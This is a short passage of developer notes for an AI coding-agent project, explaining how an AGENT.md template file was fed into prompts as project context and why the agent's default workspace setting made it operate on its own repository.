- `AGENT.md` at the repo root is *workspace* context read by `prompt-builder.js`, not
  instructions for you. It belongs to whatever project the agent is pointed at. It was the
  unedited stock template until 2026-09-16 — 740 bytes of `<!-- Describe your project here -->`
  going into every turn-0 prompt as this project's context, because `_loadAgentMd` skips a file
  only when its trimmed body is *empty* and a template full of headings is not. It now says what
  this project is; `instruction-sources.js` flags the template state so the next one cannot sit
  there unnoticed.
- The agent defaults to `--workspace ../`, so running it here makes it operate on its own repo.
  That is why this repo kept accumulating agent state.
